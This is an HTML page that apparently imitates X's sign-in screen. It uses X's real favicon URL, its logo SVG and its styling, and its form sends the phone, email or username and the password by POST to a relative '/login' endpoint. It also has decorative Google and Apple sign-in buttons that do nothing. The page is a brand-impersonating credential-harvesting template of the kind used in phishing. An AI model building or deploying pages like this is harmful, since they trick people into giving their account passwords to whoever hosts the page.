<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Log in to X</title>
<link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes glow{0%,100%{filter:drop-shadow(0 0 5px rgba(29,155,240,0.3))}50%{filter:drop-shadow(0 0 15px rgba(29,155,240,0.5))}}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;color:#e7e9ea;display:flex;align-items:center;justify-content:center;min-height:100vh}
.container{display:flex;align-items:center;justify-content:center;width:100%;max-width:900px;padding:20px;gap:60px}
.left{flex:1;display:flex;align-items:center;justify-content:center;animation:fadeIn 1s ease}
.left svg{width:300px;height:300px;fill:#e7e9ea;animation:glow 3s ease infinite}
.right{width:364px;animation:fadeInUp 0.8s cubic-bezier(0.16,1,0.3,1)}
h1{font-size:31px;font-weight:700;margin-bottom:32px}
.btn-oauth{width:100%;padding:12px;background:white;color:#0f1419;border:none;border-radius:20px;font-size:15px;font-weight:500;cursor:pointer;margin-bottom:12px;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:8px}
.btn-oauth:hover{background:#e7e9ea;transform:scale(1.02)}
.divider{display:flex;align-items:center;margin:20px 0}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#2f3336}
.divider span{padding:0 12px;color:#71767b;font-size:14px}
.input-group{position:relative;margin-bottom:20px}
.input-group input{width:100%;padding:18px 12px 8px;background:transparent;border:1px solid #333639;border-radius:6px;color:#e7e9ea;font-size:17px;outline:none;transition:all 0.3s}
.input-group input:focus{border-color:#1d9bf0;box-shadow:0 0 0 2px rgba(29,155,240,0.2)}
.input-group label{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:#71767b;font-size:17px;pointer-events:none;transition:all 0.3s}
.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:10px;font-size:12px;color:#1d9bf0}
.forgot{color:#1d9bf0;font-size:14px;text-decoration:none;display:block;margin-bottom:24px}
.login-btn{width:100%;padding:14px;background:#eff3f4;color:#0f1419;border:none;border-radius:24px;font-size:17px;font-weight:700;cursor:pointer;transition:all 0.3s}
.login-btn:hover{background:#d7dbdc;transform:translateY(-1px)}
.signup{margin-top:40px;font-size:17px;color:#71767b}
.signup a{color:#1d9bf0;text-decoration:none}
@media(max-width:768px){.container{flex-direction:column;gap:20px}.left svg{width:80px;height:80px}.right{width:100%;max-width:364px}}
</style>
</head>
<body>
<div class="container">
    <div class="left">
        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
    </div>
    <div class="right">
        <h1>Sign in to X</h1>
        <button class="btn-oauth">🔵 Sign in with Google</button>
        <button class="btn-oauth">🍎 Sign in with Apple</button>
        <div class="divider"><span>or</span></div>
        <form action="/login" method="POST">
            <div class="input-group">
                <input type="text" name="email" id="email" placeholder=" " required>
                <label for="email">Phone, email, or username</label>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder=" " required>
                <label for="password">Password</label>
            </div>
            <a href="#" class="forgot">Forgot password?</a>
            <button type="submit" class="login-btn">Sign in</button>
        </form>
        <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
    </div>
</div>
</body>
</html>
